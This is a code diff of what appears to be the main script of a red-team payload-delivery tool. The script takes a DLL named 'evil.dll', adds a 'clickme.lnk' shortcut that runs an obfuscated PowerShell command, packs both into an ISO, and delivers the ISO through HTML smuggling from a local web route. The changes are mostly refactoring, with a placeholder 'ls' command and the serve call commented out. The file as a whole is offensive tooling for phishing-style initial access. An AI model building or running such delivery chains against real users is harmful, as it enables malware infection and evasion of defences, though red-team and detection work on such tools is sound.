@@ -1,21 +1,22 @@
 from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
 from make.lnk.lnk import makeLnk
 from make.iso.iso import makeIso
-from obfuscate.powershell.obfuscatepowershell import obfuscatePowershell
+from make.powershell.powershell import makePowershell
 
-from helpers import readFileContent, saveAceFile
-from model import AceFile, AceRoute
+from helpers import readFileContent, saveAceFile, makeAceFile
+from model import AceFile, AceRoute, PluginDecorator
 from web import serve
+
 
 
 def main():
     # DLL
     payloadData = readFileContent('payloads/evil.dll')
-    payloadFile = AceFile('evil.dll', payloadData)
+    payloadFile = makeAceFile('evil.dll', payloadData)
     
     # LNK to powershell.exe to execute DLL
     payloadExecData = 'ls evil.dll'
-    payloadExecData = obfuscatePowershell(
+    payloadExecData = makePowershell(
         input=payloadExecData,
         options={},
     )
@@ -24,7 +25,7 @@ def main():
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         arguments = "-noexit -command {}".format(payloadExecData),
     )
-    payloadExeFile = AceFile('clickme.lnk', payloadExec)
+    payloadExeFile = makeAceFile('clickme.lnk', payloadExec)
 
     # Pack DLL and LNK into ISO
     container = makeIso(
@@ -33,7 +34,7 @@ def main():
             payloadExeFile,
         ],
     )
-    containerFile = AceFile('test2.iso', container)
+    containerFile = makeAceFile('test2.iso', container)
 
     # HTML to serve ISO
     html = makeHtmlSmuggling(
@@ -42,7 +43,7 @@ def main():
 
     # serve HTML
     serveHtml = AceRoute('/test2', html)
-    serve([serveHtml])
+    #serve([serveHtml])
 
 
 if __name__ == "__main__":
